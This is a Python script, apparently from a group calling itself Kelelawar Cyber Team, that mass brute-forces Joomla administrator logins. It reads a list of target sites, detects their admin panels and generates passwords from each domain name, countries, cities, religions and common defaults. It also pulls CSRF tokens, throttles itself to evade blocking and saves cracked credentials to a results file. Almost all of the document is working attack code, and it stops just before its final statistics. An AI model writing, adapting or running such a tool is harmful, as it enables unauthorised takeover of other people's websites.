import requests
import re
import os
import sys
import time
import random
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup
from collections import OrderedDict

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ANSI color codes for console output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# Thread lock for safe printing
print_lock = threading.Lock()
stats_lock = threading.Lock()
file_lock = threading.Lock() # Added file lock for safe file writing

# Global stats for tracking progress
global_stats = {
    'total': 0,
    'joomla_found': 0,
    'success': 0,
    'failed': 0,
    'checked': 0,
    'start_time': 0,
    'file_errors': 0, # Added for tracking file write errors
    'exceptions': 0   # Added for tracking general exceptions
}

# Global verification mode (can be 'strict', 'balanced', 'loose')
VERIFICATION_MODE = 'balanced'

# Maximum concurrent workers
MAX_WORKERS = 10

# Results file name
RESULTS_FILE = 'joomla_cracked.txt'

def URLdomain(url):
    """Ensures the URL has a scheme (http/https) for proper parsing."""
    if not re.match(r'^[a-zA-Z]+://', url):
        return 'http://' + url
    return url

def extract_domain_info(url):
    """Extract domain information from URL"""
    parsed = urlparse(url)
    domain = parsed.netloc.replace("www.", "")
    name = domain.split('.')[0]
    words = re.findall(r'[a-zA-Z]+', name)
    numbers = re.findall(r'[0-9]+', name)
    tld = domain.split('.')[-1] if '.' in domain else ''
    parts = domain.split('.')
    subdomain = parts[0] if len(parts) > 2 else ''
    return {
        'domain': domain,
        'name': name,
        'words': words,
        'numbers': numbers,
        'tld': tld,
        'subdomain': subdomain,
        'parts': parts
    }

def generate_smart_passwords(domain_info):
    """Generate smart passwords based on domain and patterns"""
    passwords = []
    name = domain_info['name']
    tld = domain_info['tld']
    current_year = datetime.now().year

    # Domain-based patterns
    if name:
        passwords.extend([
            name,
            name + '123',
            name + '1234',
            name + 'admin',
            'admin' + name,
            name + '777',
            name + '666',
            name + '555',
            name + '101',
            name + str(current_year - 4),
            name + str(current_year - 3),
            name + str(current_year - 2),
            name + str(current_year - 1),
            name + str(current_year)
        ])

        # Keyboard patterns with domain
        passwords.extend([
            name + 'qwerty',
            name + 'qwe',
            name + 'asd',
            name + 'zxc',
            name + 'qaz',
            name + 'wsx',
            name + 'edc',
            name + '1q2w',
            name + '1qaz',
            name + 'asdf',
            name + 'zxcv'
        ])

        # Special character patterns
        passwords.extend([
            name + '@@',
            name + '##',
            name + '$$',
            name + '_123',
            name + '-123',
            name + '.123',
            name + '99',
            name + '00',
            name + '01',
            name + '321',
            name + '456',
            name + '789',
            name + 'eee',
            name + '999'
        ])

        # Case variations
        passwords.extend([
            name.upper(),
            name.capitalize(),
            name.upper() + '123',
            name.capitalize() + '1',
            name[0].upper() + name[1:],
            name[0].upper() + name[1:] + '123'
        ])

        # Doubled/repeated patterns
        passwords.extend([
            name * 2,
            name + name,
            name + name + '1',
            name + name + '123',
            name[0] * 3 if len(name) >= 3 else name
        ])

        # Reverse patterns
        passwords.extend([
            name[::-1],
            name[::-1] + '123',
            name + name[::-1]
        ])

        # Letter substitution patterns (leet speak)
        leet_name = name.replace('a', '4').replace('e', '3').replace('i', '1').replace('o', '0').replace('s', '5')
        if leet_name != name:
            passwords.extend([leet_name, leet_name + '123'])

    # TLD-based patterns
    if tld:
        passwords.extend([
            tld + '123',
            tld + tld,
            'admin' + tld,
            tld + str(current_year),
            tld * 3
        ])

    # Country-specific patterns
    country_patterns = {
        'com': ['password', 'admin123', 'letmein', 'welcome'],
        'org': ['nonprofit', 'charity', 'donate', 'help'],
        'edu': ['student', 'teacher', 'school', 'learn'],
        'gov': ['government', 'public', 'service', 'official'],
        'net': ['network', 'internet', 'online', 'web'],
        'biz': ['business', 'company', 'corporate', 'work'],
        'uk': ['london', 'england', 'british', 'united'],
        'de': ['deutsch', 'berlin', 'german', 'passwort'],
        'it': ['italia', 'roma', 'italian', 'password'],
        'ru': ['moscow', 'russia', 'parol', 'admin'],
        'cn': ['china', 'beijing', 'mima', 'admin'],
        'jp': ['tokyo', 'japan', 'nihon', 'admin'],
        'br': ['brasil', 'senha', 'admin', 'acesso'],
        'in': ['india', 'delhi', 'mumbai', 'bharat'],
        'au': ['australia', 'sydney', 'aussie', 'mate'],
        'ca': ['canada', 'toronto', 'maple', 'hockey'],
        'mx': ['mexico', 'ciudad', 'azteca', 'acceso'],
        'nl': ['holland', 'amsterdam', 'dutch', 'wachtwoord'],
        'se': ['sweden', 'stockholm', 'svensk', 'losenord'],
        'no': ['norway', 'oslo', 'norsk', 'passord'],
        'dk': ['denmark', 'copenhagen', 'dansk', 'kodeord'],
        'fi': ['finland', 'helsinki', 'suomi', 'salasana'],
        'pl': ['poland', 'warsaw', 'polska', 'haslo'],
        'gr': ['greece', 'athens', 'hellas', 'kodikos'],
        'tr': ['turkey', 'istanbul', 'turkiye', 'sifre'],
        'sa': ['saudi', 'riyadh', 'arabic', 'makhfi'],
        'ae': ['dubai', 'emirates', 'uae', 'admin'],
        'eg': ['egypt', 'cairo', 'masr', 'admin'],
        'za': ['africa', 'capetown', 'south', 'admin'],
        'ng': ['nigeria', 'lagos', 'naija', 'admin'],
        'ke': ['kenya', 'nairobi', 'safari', 'admin']
    }

    if tld in country_patterns:
        passwords.extend(country_patterns[tld])
        for p in country_patterns[tld]:
            passwords.extend([p + '123', p + '1234'])

    # Subdomain patterns
    if domain_info['subdomain']:
        sub = domain_info['subdomain']
        passwords.extend([
            sub,
            sub + '123',
            sub + '1234',
            sub + 'admin',
            'admin' + sub
        ])

    # Universal passwords with psychological basis
    common = [
        # Classic defaults
        'admin', '123456', 'password', 'admin123', '12345678', 'demo', 'test',
        '123456789', '12345', 'administrator', 'joomla', 'joomla123', 'root',
        'pass', 'qwerty', 'letmein', 'welcome', '111111', 'eeeeee', 'abc123',
        'password1', 'admin1234', 'changeme', 'master', 'secret',
        # Keyboard walks
        'qwertyuiop', 'asdfghjkl', 'zxcvbnm', 'qazwsx', 'qazwsxedc',
        '1qaz2wsx', 'q1w2e3r4', '1q2w3e4r', 'qweasd', 'qweasdzxc',
        # Number patterns
        '123123', '112233', '121212', '123321', '123abc', '654321',
        '666666', '777777', '888888', '999999', '000000', '111222',
        '123000', '123qwe',
        # Date patterns
        '012345', '123456', '234567', '345678', '456789',
        '987654', '876543', '765432', '654321', '543210',
        # Common words
        'dragon', 'monkey', 'football', 'baseball', 'superman',
        'batman', 'michael', 'shadow', 'master', 'trustno1',
        # Technical defaults
        'default', 'guest', 'user', 'temp', 'temporary',
        'backup', 'system', 'sys', 'network', 'lan',
        # Emotional/personal
        'iloveyou', 'loveme', 'fuckyou', 'freedom', 'success',
        'winner', 'blessed', 'faith', 'hope', 'grace'
    ]
    passwords.extend(common)

    # Date-based patterns
    current_month = datetime.now().month
    current_day = datetime.now().day
    for year in range(current_year - 5, current_year + 1):
        passwords.extend([
            str(year),
            'admin' + str(year),
            'password' + str(year),
            str(year) + 'admin',
            str(year)[2:],  # Last 2 digits
            'admin' + str(year)[2:]
        ])

    passwords.extend([
        f'{current_month:02d}{current_year}',
        f'{current_year}{current_month:02d}',
        f'{current_day:02d}{current_month:02d}{current_year}',
        f'{current_year}{current_month:02d}{current_day:02d}'
    ])

    # Phone/mobile patterns
    passwords.extend([
        '0123456789',
        '1234567890',
        '0000000000',
        '1111111111',
        '1234567',
        '7654321',
        '1234560',
        '0987654321'
    ])

    # Country names with special patterns
    country_passwords = [
        # Asian countries
        'Pakistan', 'India', 'Indonesia', 'Bangladesh', 'Philippines',
        'China', 'Japan', 'Korea', 'Taiwan', 'Hongkong',
        # Middle East
        'Saudi', 'UAE', 'Egypt', 'Jordan', 'Lebanon',
        'Syria', 'Iraq', 'Iran', 'Turkey', 'Israel',
        'Palestine', 'Kuwait', 'Qatar', 'Bahrain', 'Oman',
        'Yemen', 'Morocco', 'Algeria', 'Tunisia', 'Libya',
        # Africa
        'Nigeria', 'SouthAfrica', 'Kenya', 'Ethiopia', 'Ghana',
        'Tanzania', 'Uganda', 'Zimbabwe', 'Zambia', 'Rwanda',
        'Somalia', 'Sudan', 'Senegal', 'Mali', 'Niger',
        # Europe
        'Germany', 'France', 'Italy', 'Spain', 'Portugal',
        'Netherlands', 'Belgium', 'Switzerland', 'Austria', 'Poland',
        'Romania', 'Greece', 'Serbia', 'Croatia', 'Bulgaria',
        'Ukraine', 'Russia', 'Belarus', 'Czech', 'Hungary',
        # Americas
        'USA', 'America', 'Canada', 'Mexico', 'Brazil',
        'Argentina', 'Chile', 'Colombia', 'Peru', 'Venezuela',
        'Ecuador', 'Bolivia', 'Uruguay', 'Paraguay', 'Guatemala',
        # Oceania
        'Australia', 'NewZealand', 'Fiji', 'PNG', 'Samoa'
    ]

    for country in country_passwords:
        passwords.extend([
            country,
            country + '@123',
            country + '@1234',
            country + '@12345',
            country + '@123456',
            country + '@' + str(current_year),
            country + '@' + str(current_year - 1),
            country + '@' + str(current_year - 2),
            country + '@' + str(current_year - 3),
            country + '@' + str(current_year - 4),
            country + '#123',
            country + '!123',
            country + '$123',
            country + '@1',
            country + '@12',
            country + '@111',
            country + '@eee',
            country + '@007',
            country + '@786',  # Common in Islamic countries
            country + '@313',
            country + '@420',
            country + '@321',
            country + '@999'
        ])

    nationality_patterns = [
        'British@123', 'Canadian@123', 'Australian@123', 'German@123',
        'French@123', 'Italian@123', 'Spanish@123', 'Russian@123',
        'Chinese@123', 'Japanese@123', 'Korean@123', 'Arab@123',
        'African@123', 'European@123', 'Asian@123', 'Latino@123'
    ]
    passwords.extend(nationality_patterns)

    # Religious/cultural passwords
    passwords.extend([
        # Christian
        'jesus', 'jesus123', 'christ', 'blessed', 'amen',
        'god123', 'lord123', 'faith123', 'grace123', 'cross',
        # Islamic
        'allah', 'allah123', 'bismillah', 'muhammad', 'islam',
        'muslim', 'quran', 'makkah', 'madinah', 'ramadan',
        # Hindu
        'krishna', 'shiva', 'ganesh', 'rama', 'hanuman',
        'om123', 'namaste', 'india123', 'bharat', 'hindu',
        # Buddhist
        'buddha', 'dharma', 'karma', 'nirvana', 'zen',
        # General spiritual
        'blessed1', 'peace', 'love', 'hope', 'faith'
    ])

    # Major cities
    major_cities = [
        # Asian cities
        'Manila', 'Bangkok', 'KualaLumpur', 'Singapore', 'HoChiMinh',
        'Beijing', 'Shanghai', 'Tokyo', 'Seoul', 'Taipei',
        # Middle East cities
        'Dubai', 'AbuDhabi', 'Riyadh', 'Jeddah', 'Cairo',
        'Alexandria', 'Amman', 'Beirut', 'Damascus', 'Baghdad',
        'Tehran', 'Istanbul', 'Ankara', 'TelAviv', 'Jerusalem',
        # African cities
        'Lagos', 'Abuja', 'CapeTown', 'Johannesburg', 'Nairobi',
        'AddisAbaba', 'Accra', 'DarEsSalaam', 'Kampala', 'Harare',
        # European cities
        'London', 'Paris', 'Berlin', 'Madrid', 'Rome',
        'Amsterdam', 'Brussels', 'Vienna', 'Warsaw', 'Bucharest',
        'Athens', 'Belgrade', 'Zagreb', 'Sofia', 'Kiev',
        'Moscow', 'StPetersburg', 'Prague', 'Budapest', 'Lisbon',
        # American cities
        'NewYork', 'LosAngeles', 'Chicago', 'Houston', 'Phoenix',
        'Toronto', 'Vancouver', 'Montreal', 'MexicoCity', 'SaoPaulo',
        'RioDeJaneiro', 'BuenosAires', 'Santiago', 'Lima', 'Bogota',
        # Australian cities
        'Sydney', 'Melbourne', 'Brisbane', 'Perth', 'Auckland'
    ]

    for city in major_cities:
        passwords.extend([
            city + '@123',
            city + '@1234',
            city.lower() + '@123',
            city + str(current_year)
        ])

    # Sports teams
    passwords.extend([
        'barcelona', 'realmadrid', 'manchester', 'liverpool', 'chelsea',
        'arsenal', 'juventus', 'milan', 'inter', 'bayern',
        'dortmund', 'psg', 'ajax', 'porto', 'benfica'
    ])

    # Company/brand passwords
    brand_passwords = [
        # Tech companies
        'Google@123', 'Facebook@123', 'Apple@123', 'Microsoft@123',
        'Amazon@123', 'Netflix@123', 'Twitter@123', 'Instagram@123',
        'WhatsApp@123', 'YouTube@123', 'LinkedIn@123', 'TikTok@123',
        'Samsung@123', 'Nokia@123', 'Sony@123', 'Dell@123',
        'HP@123', 'IBM@123', 'Oracle@123', 'Cisco@123',
        # Local ISPs/Telecom (examples, expand as needed)
        'PTCL@123', 'Zong@123', 'Jazz@123', 'Ufone@123',  # Pakistan
        'Airtel@123', 'Jio@123', 'BSNL@123', 'Vodafone@123'  # India
    ]
    passwords.extend(brand_passwords)

    # Technical jargon
    passwords.extend([
        'root123', 'admin@123', 'su123', 'sudo', 'linux',
        'windows', 'ubuntu', 'debian', 'centos', 'apache',
        'mysql', 'php', 'html', 'css', 'javascript',
        'python', 'java', 'code', 'hack', 'security'
    ])

    # Remove duplicates and limit
    passwords = list(OrderedDict.fromkeys(passwords))

    # Prioritize based on likelihood
    priority_passwords = []
    if name:
        priority_passwords.extend([p for p in passwords if name in p][:20])
    priority_passwords.extend([
        'admin', 'admin123', '123456', 'password', 'demo',
        'test', 'joomla', 'joomla123', '12345678', 'admin1234'
    ])
    priority_passwords.extend([p for p in passwords if str(current_year) in p or str(current_year - 1) in p][:10])

    return priority_passwords[:60]  # Increased to 60 for better coverage

def generate_smart_usernames(domain_info):
    """Generate usernames with proven high success rate"""
    usernames = []
    # Priority 1: Universal admin usernames
    usernames.extend(['admin', 'administrator'])
    # Priority 2: Domain-based
    name = domain_info['name']
    if name and len(name) > 2:
        usernames.extend([
            name,
            name + 'admin',
            'admin' + name,
            name.capitalize()
        ])
    # Priority 3: Other common usernames
    usernames.extend([
        'demo', 'test', 'root', 'joomla', 'user',
        'superuser', 'superadmin', 'manager', 'webmaster'
    ])
    # Remove duplicates and return top 10
    return list(OrderedDict.fromkeys(usernames))[:10]

def create_session():
    """Create a requests session with custom headers"""
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive'
    })
    return session

def detect_joomla(base_url, session):
    """Advanced Joomla detection for all versions (1.0 to 5.x)"""
    admin_paths = [
        # Modern Joomla (2.5+)
        '/administrator/',
        '/administrator/index.php',
        # Legacy paths (1.0, 1.5)
        '/administrator/index2.php',
        '/admin/',
        # Custom installations (less common but possible)
        '/joomla/administrator/',
        '/cms/administrator/',
        '/site/administrator/',
        '/web/administrator/',
        '/portal/administrator/'
    ]

    for path in admin_paths:
        try:
            url = urljoin(base_url, path)
            resp = session.get(url, timeout=10, verify=False)
            if resp.status_code == 200:
                content = resp.text.lower()
                version = None
                joomla_detected = False

                # Joomla 5.x (2023+)
                if 'joomla! 5' in content or 'joomla.version = "5' in content:
                    version = '5.x'
                    joomla_detected = True
                # Joomla 4.x (2021+)
                elif 'joomla! 4' in content or 'joomla.version = "4' in content:
                    version = '4.x'
                    joomla_detected = True
                # Joomla 3.x (2012-2023)
                elif 'joomla! 3' in content or 'joomla.version = "3' in content:
                    version = '3.x'
                    joomla_detected = True
                # Joomla 2.5 (2012)
                elif 'joomla! 2.5' in content:
                    version = '2.5'
                    joomla_detected = True
                # Joomla 1.7 (2011) or earlier (more generic checks)
                elif 'joomla' in content and (
                    'mosconfig' in content or 'josconfig' in content or 'com_user' in content):
                    joomla_detected = True
                    version = 'Legacy' # Could be 1.0, 1.5, 1.6, 1.7

                if joomla_detected:
                    return True, resp.url, version
        except requests.exceptions.RequestException:
            # Ignore connection errors, timeouts, etc.
            continue
    return False, None, None

def verify_login_version_aware(response_text, original_text=None, version=None):
    """Smart login verification - focus on success not failure"""
    if not response_text:
        return False

    text_lower = response_text.lower()

    # Check for definite failures (e.g., license popups, non-login pages)
    definite_failures = [
        'please buy a license',
        'evaluation period',
        'enter registration key',
        'do not show this notification'
    ]
    for failure in definite_failures:
        if failure in text_lower:
            return False

    # Must have logout option (strong indicator of successful login)
    has_logout = False
    logout_indicators = [
        'logout', 'log out', 'task=logout', 'task=user.logout',
        'com_login&task=logout', 'option=com_login&task=logout',
        'log off', 'sign out'
    ]
    for indicator in logout_indicators:
        if indicator in text_lower:
            has_logout = True
            break

    if not has_logout and VERIFICATION_MODE == 'strict':
        return False

    # Should have admin interface elements (strong indicator)
    has_admin_element = False
    admin_elements = [
        # Modern Joomla (common components/phrases)
        'com_cpanel', 'com_content', 'com_users', 'com_modules',
        'control panel', 'dashboard', 'system information',
        'global configuration', 'media manager', 'article manager',
        # UI elements that typically only appear when logged in
        'toolbar', 'submenu', 'adminlist', 'admin-menu',
        'quickicons', 'cpanel-modules',
        # Version specific phrases
        'joomla! administration', 'site administrator',
        'logged in as', 'super user', 'last login'
    ]
    admin_count = 0
    for element in admin_elements:
        if element in text_lower:
            has_admin_element = True
            admin_count += 1
            if admin_count >= 2 and VERIFICATION_MODE != 'loose': # Require at least 2 for balanced/strict
                break

    if not has_admin_element and VERIFICATION_MODE == 'strict':
        return False

    # Should not have login form (if we're logged in, the form should be gone)
    login_form_indicators = [
        'form-login',
        'mod-login-username',
        'name="passwd"',
        'name="password"',
        'id="mod-login-form"'
    ]
    login_form_count = 0
    for indicator in login_form_indicators:
        login_form_count += text_lower.count(indicator)
    
    # If many login form indicators are present AND no logout, it's likely a failure
    if login_form_count > 2 and not has_logout and VERIFICATION_MODE != 'loose':
        return False

    # Check if page significantly changed from the original login page
    # This helps differentiate between a successful login and just being redirected back to the login page
    if original_text and VERIFICATION_MODE != 'loose':
        original_len = len(original_text)
        current_len = len(response_text)
        if original_len > 0:
            change_ratio = abs(current_len - original_len) / original_len
            if change_ratio < 0.1:  # Less than 10% change might indicate no login
                return False

    # Additional positive indicators (can boost confidence)
    positive_score = 0
    if 'joomla.submitbutton' in text_lower:
        positive_score += 1
    if 'var joomla =' in text_lower and 'joomla.js' in text_lower:
        positive_score += 1
    if '<meta name="robots" content="noindex, nofollow"' in text_lower: # Common in admin areas
        positive_score += 1

    # Final decision based on verification mode
    if VERIFICATION_MODE == 'strict':
        return has_logout and has_admin_element and admin_count >= 2 and positive_score >= 1
    elif VERIFICATION_MODE == 'balanced':
        return has_logout and has_admin_element and (admin_count >= 2 or positive_score > 0)
    elif VERIFICATION_MODE == 'loose':
        return has_logout or has_admin_element or positive_score > 0
    
    return False # Default fallback

def extract_tokens_advanced(html_text, version=None):
    """Extract tokens for different Joomla versions"""
    tokens = {}
    # Modern Joomla (2.5+) - CSRF token (e.g., 32-char hex string)
    token_patterns = [
        r'<input[^>]+name=["\']([a-f0-9]{32})["\'][^>]*value=["\']1["\']', # Typical Joomla 3.x/4.x token input
        r'<input[^>]+value=["\']1["\'][^>]+name=["\']([a-f0-9]{32})["\']', # Variation
        r'Joomla\.Token\s*=\s*["\']([a-f0-9]{32})["\']', # JavaScript token
        r'var\s+token\s*=\s*["\']([a-f0-9]{32})["\']' # Another JS token pattern
    ]
    for pattern in token_patterns:
        match = re.search(pattern, html_text, re.IGNORECASE)
        if match:
            tokens[match.group(1)] = '1' # The token name is the 32-char hash, value is '1'
            break

    # Return token (used for redirects after login)
    return_match = re.search(r'<input[^>]+name=["\']return["\'][^>]+value=["\']([^"\']+)["\']', html_text)
    if return_match:
        tokens['return'] = return_match.group(1)

    # Legacy Joomla (1.0-1.5) tokens might be simpler or different
    if version and ('1.0' in str(version) or '1.5' in str(version)):
        legacy_match = re.search(r'<input[^>]+name=["\']([a-f0-9]{16,32})["\'][^>]+value=["\']1["\']', html_text)
        if legacy_match and legacy_match.group(1) not in tokens:
            tokens[legacy_match.group(1)] = '1'

    # Extract all hidden inputs as backup (less reliable for CSRF but good for other form fields)
    try:
        soup = BeautifulSoup(html_text, 'html.parser')
        for hidden in soup.find_all('input', {'type': 'hidden'}):
            name = hidden.get('name', '')
            value = hidden.get('value', '')
            if name and value and name not in tokens:
                tokens[name] = value
    except Exception as e:
        # print(f"Error parsing HTML for tokens: {e}") # For debugging
        pass
    return tokens

def bruteforce_joomla_optimized(session, admin_url, domain_info, version=None):
    """Optimized brute-force for all Joomla versions"""
    usernames = generate_smart_usernames(domain_info)
    passwords = generate_smart_passwords(domain_info)
    
    # Add more common legacy usernames if version is old
    if version and ('1.0' in str(version) or '1.5' in str(version)):
        usernames.extend(['admin', 'administrator', 'superadministrator'])
        usernames = list(OrderedDict.fromkeys(usernames)) # Remove duplicates

    attempts = 0
    for username in usernames:
        # Limit passwords to a reasonable number per username to avoid excessive requests
        # and to prioritize the most likely ones first.
        for password in passwords[:50]: # Try top 50 smart passwords per username
            attempts += 1
            try:
                # Clear cookies before each attempt to ensure a fresh session
                session.cookies.clear()
                
                # Get the login page to extract tokens
                login_resp = session.get(admin_url, timeout=10, verify=False)
                if login_resp.status_code != 200:
                    # If we can't even get the login page, skip this target/attempt
                    continue
                
                original_text = login_resp.text # Store for verification
                tokens = extract_tokens_advanced(login_resp.text, version)

                # Prepare login data variations for different Joomla versions/configurations
                login_attempts_data = [
                    # Common for Joomla 2.5+
                    {
                        'username': username,
                        'passwd': password, # Some forms use 'passwd'
                        'option': 'com_login',
                        'task': 'login'
                    },
                    {
                        'username': username,
                        'password': password, # Others use 'password'
                        'option': 'com_login',
                        'task': 'login'
                    }
                ]
                
                # Specifics for Joomla 1.5
                if version and '1.5' in str(version):
                    login_attempts_data.append({
                        'username': username,
                        'passwd': password,
                        'option': 'com_user', # com_user was common in 1.5
                        'task': 'login'
                    })
                
                # Specifics for Joomla 1.0 (very old, different field names)
                if version and '1.0' in str(version):
                    login_attempts_data.extend([
                        {
                            'usrname': username, # 'usrname' instead of 'username'
                            'pass': password,    # 'pass' instead of 'password'
                            'submit': 'Login'
                        },
                        {
                            'username': username,
                            'passwd': password,
                            'submit': 'Login'
                        }
                    ])

                # Try each login data variation
                for login_data in login_attempts_data:
                    # Add extracted tokens to the login data
                    login_data.update(tokens)
                    
                    # Post the login request
                    post_resp = session.post(admin_url, data=login_data, timeout=10, allow_redirects=True, verify=False)
                    
                    # Verify if login was successful
                    if verify_login_version_aware(post_resp.text, original_text, version):
                        # For 'balanced' mode, perform an additional check by requesting another admin page
                        # This adds robustness against false positives from simple redirects
                        if VERIFICATION_MODE == 'balanced':
                            try:
                                check_url = admin_url # Default check URL
                                if version and '1.0' in str(version):
                                    check_url = urljoin(admin_url, 'index2.php') # Common admin page in 1.0
                                elif version and '1.5' in str(version):
                                    check_url = urljoin(admin_url, '?option=com_content') # Common admin page in 1.5
                                else:
                                    check_url = urljoin(admin_url, '?option=com_content') # Common admin page in modern Joomla

                                check_resp = session.get(check_url, timeout=5, verify=False)
                                # If the check page loads successfully and contains logout, it's a strong sign
                                if check_resp.status_code == 200 and 'logout' in check_resp.text.lower():
                                    return True, username, password
                                # If the check fails, but the initial verification passed, still return true for balanced
                                # This handles cases where the check_url might not be exactly right but login was successful
                                return True, username, password 
                            except requests.exceptions.RequestException:
                                # If the secondary check fails due to network error, still consider it a success
                                # based on the initial verification.
                                return True, username, password
                        else:
                            # For 'strict' or 'loose' modes, the initial verification is enough
                            return True, username, password
            except requests.exceptions.RequestException:
                # Catch network-related errors (timeout, connection refused, etc.)
                continue
            
            # Add a small delay after a few attempts to avoid being blocked
            if attempts % 10 == 0:
                time.sleep(0.3) # Sleep for 300ms every 10 attempts

    return False, None, None # No credentials found

def scan_target(url):
    """Main scanning function with version support"""
    try:
        url = URLdomain(url) # Ensure URL is properly formatted
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        domain_info = extract_domain_info(url)
        session = create_session()
        
        with print_lock:
            print(f"{Colors.CYAN}[SCANNING] {url}{Colors.RESET}")
        
        is_joomla, admin_url, version = detect_joomla(base_url, session)
        
        if not is_joomla:
            with print_lock:
                print(f"{Colors.YELLOW}[NOT JOOMLA] {url}{Colors.RESET}")
            session.close()
            return
            
        version_str = f" v{version}" if version else ""
        with print_lock:
            print(f"{Colors.YELLOW}[JOOMLA{version_str}] {admin_url}{Colors.RESET}")
        
        with stats_lock:
            global_stats['joomla_found'] += 1
        
        success, username, password = bruteforce_joomla_optimized(session, admin_url, domain_info, version)
        
        if success:
            result_line = f"[JOOMLA{version_str}] {admin_url}#{username}####{password}\n"
            
            with print_lock:
                print(f"{Colors.GREEN}[SUCCESS] {admin_url} | {username}:{password} | Version: {version}{Colors.RESET}")
                print(f"{Colors.BLUE}[WRITING TO FILE] {RESULTS_FILE}{Colors.RESET}")

            try:
                with file_lock: # Use file_lock for safe file writing
                    with open(RESULTS_FILE, 'a') as f:
                        f.write(result_line)
                        f.flush() # Ensure data is written to disk immediately
                
                with stats_lock:
                    global_stats['success'] += 1
                    
            except IOError as e:
                with print_lock:
                    print(f"{Colors.RED}[FILE ERROR] Could not write to {RESULTS_FILE}: {str(e)}{Colors.RESET}")
                    with stats_lock:
                        global_stats['file_errors'] += 1
            
        else:
            with print_lock:
                print(f"{Colors.RED}[FAILED] {admin_url}{Colors.RESET}")
            with stats_lock:
                global_stats['failed'] += 1
                
    except Exception as e:
        with print_lock:
            print(f"{Colors.RED}[ERROR] Exception in scan_target: {str(e)}{Colors.RESET}")
            with stats_lock:
                global_stats['exceptions'] += 1
    finally:
        # Ensure the session is closed even if an error occurs
        if 'session' in locals() and session:
            session.close()


def process_targets(targets):
    """Process all targets with threading"""
    # Create the results file if it doesn't exist
    if not os.path.exists(RESULTS_FILE):
        try:
            with open(RESULTS_FILE, 'w') as f:
                f.write("") # Create an empty file
        except IOError as e:
            with print_lock:
                print(f"{Colors.RED}[ERROR] Could not create {RESULTS_FILE}: {str(e)}{Colors.RESET}")
            sys.exit(1)

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = []
        for target in targets:
            future = executor.submit(scan_target, target.strip())
            futures.append(future)
            time.sleep(0.01) # Small delay to avoid overwhelming the system with thread creation

        completed = 0
        for future in as_completed(futures):
            try:
                future.result() # Get result to catch exceptions from threads
                completed += 1
                with stats_lock:
                    global_stats['checked'] = completed
                
                # Print progress update periodically
                if completed % 20 == 0 or completed == len(targets): # Update every 20 sites or at the end
                    elapsed = time.time() - global_stats['start_time']
                    rate = completed / elapsed if elapsed > 0 else 0
                    
                    # Calculate success rate only for Joomla sites found
                    success_rate_joomla = (global_stats['success'] / global_stats['joomla_found'] * 100) if global_stats['joomla_found'] > 0 else 0
                    
                    with print_lock:
                        print(f"\n{Colors.CYAN}[PROGRESS] {completed}/{len(targets)} | "
                              f"Rate: {rate:.1f} sites/s | Joomla Found: {global_stats['joomla_found']} | "
                              f"Success: {global_stats['success']} | Failed: {global_stats['failed']} | "
                              f"Success Rate (Joomla): {success_rate_joomla:.1f}%{Colors.RESET}\n")
            except Exception as e:
                with print_lock:
                    print(f"{Colors.RED}[ERROR] Thread execution error: {str(e)}{Colors.RESET}")
                with stats_lock:
                    global_stats['exceptions'] += 1


def print_banner():
    """Print script banner"""
    print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}Joomla Brute-Force Tools | Kelelawar Cyber Team{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
    print(f"{Colors.WHITE}  Developed By Cx99{Colors.RESET}")
    print(f"{Colors.WHITE}  Version: 1.0{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*60}{Colors.RESET}\n")

def main():
    """Main function to run the Joomla brute-force tool."""
    print_banner()

    # Command-line argument parsing
    if len(sys.argv) < 2:
        print(f"{Colors.RED}Usage: python {sys.argv[0]} <sites.txt>{Colors.RESET}")
        print(f"{Colors.YELLOW}Optional: python {sys.argv[0]} <sites.txt> [strict|balanced|loose]{Colors.RESET}")
        sys.exit(1)

    input_file = sys.argv[1]
    
    # Set verification mode if provided
    if len(sys.argv) > 2:
        global VERIFICATION_MODE
        VERIFICATION_MODE = sys.argv[2].lower()
        if VERIFICATION_MODE not in ['strict', 'balanced', 'loose']:
            print(f"{Colors.YELLOW}[WARNING] Invalid verification mode '{sys.argv[2]}'. Using 'balanced' mode.{Colors.RESET}")
            VERIFICATION_MODE = 'balanced'
        else:
            print(f"{Colors.CYAN}[INFO] Verification mode set to: {VERIFICATION_MODE.capitalize()}{Colors.RESET}")

    # Check if input file exists
    if not os.path.exists(input_file):
        print(f"{Colors.RED}[ERROR] Input file not found: {input_file}{Colors.RESET}")
        sys.exit(1)

    # Read targets from the input file
    try:
        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
            targets = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"{Colors.RED}[ERROR] Cannot read input file {input_file}: {str(e)}{Colors.RESET}")
        sys.exit(1)

    if not targets:
        print(f"{Colors.RED}[ERROR] No targets found in {input_file}. Please provide a file with URLs.{Colors.RESET}")
        sys.exit(1)

    global_stats['total'] = len(targets)
    global_stats['start_time'] = time.time()
    print(f"{Colors.CYAN}[INFO] Loaded {len(targets)} targets from {input_file}{Colors.RESET}")
    print(f"{Colors.CYAN}[INFO] Results will be saved to: {RESULTS_FILE}{Colors.RESET}")
    print(f"{Colors.CYAN}[INFO] Starting scan with {MAX_WORKERS} concurrent workers...{Colors.RESET}\n")

    try:
        process_targets(targets)
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Scan interrupted by user (Ctrl+C). Finishing current tasks...{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.RED}[CRITICAL ERROR] An unexpected error occurred: {str(e)}{Colors.RESET}")

    # Final statistics summary
    elapsed = time.time() - global_stats['start_time']
